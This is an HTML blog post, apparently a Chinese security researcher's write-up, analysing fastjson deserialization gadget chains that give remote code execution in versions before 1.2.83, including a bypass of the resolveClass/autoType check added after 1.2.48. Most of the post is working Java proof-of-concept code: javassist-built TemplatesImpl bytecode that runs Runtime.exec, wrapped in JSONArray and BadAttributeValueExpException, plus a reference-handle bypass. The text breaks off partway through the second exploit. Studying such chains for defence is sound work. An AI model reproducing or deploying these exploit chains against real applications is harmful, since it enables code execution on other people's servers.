@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="fastjson 1.2.83版本前通杀关于fastjson序列化漏洞，我们找到两个类实现了Serializable接口，一个是JSONArray，一个是JSONObject，但是都没有readObject 但是在JSONArray的父类JSON，这里(new JSONSerializer(out)).write(this);这里是会(this)的调用getter方法，然后他是由toString(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1.2.83版本前通杀">
+<meta property="og:url" content="http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="fastjson 1.2.83版本前通杀关于fastjson序列化漏洞，我们找到两个类实现了Serializable接口，一个是JSONArray，一个是JSONObject，但是都没有readObject 但是在JSONArray的父类JSON，这里(new JSONSerializer(out)).write(this);这里是会(this)的调用getter方法，然后他是由toString(">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-09T10:39:24.000Z">
+<meta property="article:modified_time" content="2025-01-09T10:40:40.364Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>1.2.83版本前通杀</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/09/serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&text=1.2.83版本前通杀"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&is_video=false&description=1.2.83版本前通杀"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=1.2.83版本前通杀&body=Check out this article: http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&name=1.2.83版本前通杀&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&t=1.2.83版本前通杀"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.83版本前通杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48%E4%B9%8B%E5%89%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.2.48之前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48%E4%B9%8B%E5%90%8E"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.48之后</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        1.2.83版本前通杀
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-09T10:39:24.000Z" class="dt-published" itemprop="datePublished">2025-01-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="fastjson-1-2-83版本前通杀"><a href="#fastjson-1-2-83版本前通杀" class="headerlink" title="fastjson 1.2.83版本前通杀"></a>fastjson 1.2.83版本前通杀</h1><p>关于fastjson序列化漏洞，我们找到两个类实现了Serializable接口，一个是JSONArray，一个是JSONObject，但是都没有readObject</p>
+<p>但是在JSONArray的父类JSON，这里<code>(new JSONSerializer(out)).write(this);</code>这里是会(this)的调用getter方法，然后他是由<code>toString()</code>触发的，那么就有很多方法了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;return this.toJSONString();&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public String toJSONString() &#123;</span><br><span class="line">        SerializeWriter out = new SerializeWriter();</span><br><span class="line"></span><br><span class="line">        String var2;</span><br><span class="line">        try &#123;</span><br><span class="line">            (new JSONSerializer(out)).write(this);</span><br><span class="line">            var2 = out.toString();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return var2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们自己来试验一下</p>
+<p>person.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    public int age;</span><br><span class="line">    public Map map;</span><br><span class="line"></span><br><span class="line">    public Person ()&#123;</span><br><span class="line">        System.out.println(&quot;构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.println(&quot;getAge()&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) throws IOException &#123;</span><br><span class="line">        System.out.println(&quot;setAge()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public Map getName() &#123;</span><br><span class="line">        System.out.println(&quot;getName()&quot;);</span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Person person = new Person();</span><br><span class="line">        String JSON_Serialize = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(JSON_Serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实更加贴合我们利用方法的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Person person = new Person();</span><br><span class="line">        JSONArray jsonArray = new JSONArray();</span><br><span class="line">        jsonArray.add(person);</span><br><span class="line">        jsonArray.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-48之前"><a href="#1-2-48之前" class="headerlink" title="1.2.48之前"></a>1.2.48之前</h2><p>很容易可以想到CC链中存在BadAttributeValueExpExeption中的readObject方法能够触发toString方法，他的readObject，里面有toString</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">        if (valObj == null) &#123;</span><br><span class="line">            val = null;</span><br><span class="line">        &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; else if (System.getSecurityManager() == null</span><br><span class="line">                || valObj instanceof Long</span><br><span class="line">                || valObj instanceof Integer</span><br><span class="line">                || valObj instanceof Float</span><br><span class="line">                || valObj instanceof Double</span><br><span class="line">                || valObj instanceof Byte</span><br><span class="line">                || valObj instanceof Short</span><br><span class="line">                || valObj instanceof Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix</span><br><span class="line">            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后TemplatesImpl正好，里面触发条件就是get方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Properties getOutputProperties() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (TransformerConfigurationException e) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()</span><br><span class="line">    throws TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    if (_uriResolver != null) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(true);</span><br><span class="line">    &#125;</span><br><span class="line">    return transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()</span><br><span class="line">    throws TransformerConfigurationException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (_name == null) return null;</span><br><span class="line"></span><br><span class="line">        if (_class == null) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        // The translet needs to keep a reference to all its auxiliary</span><br><span class="line">        // class to prevent the GC from collecting them</span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(this);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        if (_auxClasses != null) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return translet;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        throw new TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">       ClassPool pool = ClassPool.getDefault();</span><br><span class="line">       CtClass ctClass = pool.makeClass(&quot;a&quot;);</span><br><span class="line">       CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">       ctClass.setSuperclass(superClass);</span><br><span class="line">       CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span><br><span class="line">       constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">       ctClass.addConstructor(constructor);</span><br><span class="line">       byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">       TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">       setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">       setFieldValue(templatesImpl, &quot;_name&quot;, &quot;mouri-kogorou&quot;);</span><br><span class="line">       setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">       JSONArray jsonArray = new JSONArray();</span><br><span class="line">       jsonArray.add(templatesImpl);</span><br><span class="line"></span><br><span class="line">       BadAttributeValueExpException bd = new BadAttributeValueExpException(null);</span><br><span class="line">       setFieldValue(bd,&quot;val&quot;,jsonArray);</span><br><span class="line"></span><br><span class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">       ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">       objectOutputStream.writeObject(bd);</span><br><span class="line">       objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">       ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">       objectInputStream.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">   private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;</span><br><span class="line">       Field f = obj.getClass().getDeclaredField(field);</span><br><span class="line">       f.setAccessible(true);</span><br><span class="line">       f.set(obj, arg);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-48之后"><a href="#1-2-48之后" class="headerlink" title="1.2.48之后"></a>1.2.48之后</h2><p>当我们再次运行上面的poc会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br></pre></td></tr></table></figure>
+
+
+
+<p>为什么会有这个错误呢?</p>
+<p>因为你反序列化一个类的时候会看这个类是否有resolveClass,如果有，那么就会先去执行这个方法，1.2.48之后在JSONObject加了resolveClass，他会在反序列化JSONObject类的时候触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    if (name.length() &gt; 2) &#123;</span><br><span class="line">        int index = name.lastIndexOf(91);</span><br><span class="line">        if (index != -1) &#123;</span><br><span class="line">            name = name.substring(index + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (name.length() &gt; 2 &amp;&amp; name.charAt(0) == &#x27;L&#x27; &amp;&amp; name.charAt(name.length() - 1) == &#x27;;&#x27;) &#123;</span><br><span class="line">            name = name.substring(1, name.length() - 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (TypeUtils.getClassFromMapping(name) == null) &#123;</span><br><span class="line">            ParserConfig.global.checkAutoType(name, (Class)null, Feature.SupportAutoType.mask);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return super.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回顾之前学的，serialize流程，</p>
+<p>他会先readObject，然后在readObject0读取第一个字节，然后进入readOrdinaryObject，然后进入readClassDesc，进去这里读取当前对象的类描述符，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">case TC_NULL:</span><br><span class="line">    return (ObjectStreamClass) readNull();</span><br><span class="line"></span><br><span class="line">case TC_REFERENCE:</span><br><span class="line">    return (ObjectStreamClass) readHandle(unshared);</span><br><span class="line"></span><br><span class="line">case TC_PROXYCLASSDESC:</span><br><span class="line">    return readProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">case TC_CLASSDESC:</span><br><span class="line">    return readNonProxyDesc(unshared);</span><br></pre></td></tr></table></figure>
+
+<p>前三种都是不会调用resolveClass，所以我们要用前三种绕过，</p>
+<p>第一种没用，第二种就是我们的重点，就是先把他载入handles哈希表（就是之前加载过了，直接从里面提取），下面这个就是构造一个流的构造函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public ObjectInputStream(InputStream in) throws IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bin = new BlockDataInputStream(in);</span><br><span class="line">    handles = new HandleTable(10);</span><br><span class="line">    vlist = new ValidationList();</span><br><span class="line">    enableOverride = false;</span><br><span class="line">    readStreamHeader();</span><br><span class="line">    bin.setBlockDataMode(true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样他就会进入第二种</p>
+<p>就是当我们反序列化的时候，会把多次使用的类在handles这个哈希表中建立从对象到引用的映射，然后你要把需要绕过的类放在最前面</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSONArray;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] genPayload() throws Exception&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.makeClass(&quot;a&quot;);</span><br><span class="line">        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(49);</span><br><span class="line">        return clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload()&#125;);</span><br><span class="line">        setValue(templates, &quot;_name&quot;, 